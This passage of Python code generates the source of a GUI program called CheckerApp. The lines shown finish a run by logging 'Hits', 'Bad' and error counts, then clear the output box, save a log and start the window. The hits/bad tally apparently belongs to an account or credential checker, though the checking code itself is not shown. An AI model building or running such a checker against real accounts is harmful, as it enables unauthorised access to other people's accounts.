    L.append("        self.log(f\"[DONE] Hits:{stats['hits']} Bad:{stats['bad']} Err:{stats['errors']}\", 'info')")
    L.append("")
    L.append("    def _clear_output(self):")
    L.append("        self.output_box.configure(state='normal')")
    L.append("        self.output_box.delete('1.0', 'end')")
    L.append("        self.output_box.configure(state='disabled')")
    L.append("")
    L.append("    def _save_log(self):")
    L.append("        path = filedialog.asksaveasfilename(defaultextension='.txt', filetypes=[('Text','*.txt')])")
    L.append("        if not path: return")
    L.append("        with open(path, 'w', encoding='utf-8') as f:")
    L.append("            f.write(self.output_box.get('1.0', 'end'))")
    L.append("        self.log(f'[+] Log saved to {path}', 'info')")
    L.append("")
    L.append("root = ctk.CTk()")
    L.append("app  = CheckerApp(root)")
    L.append("root.mainloop()")

    return "\n".join(L)
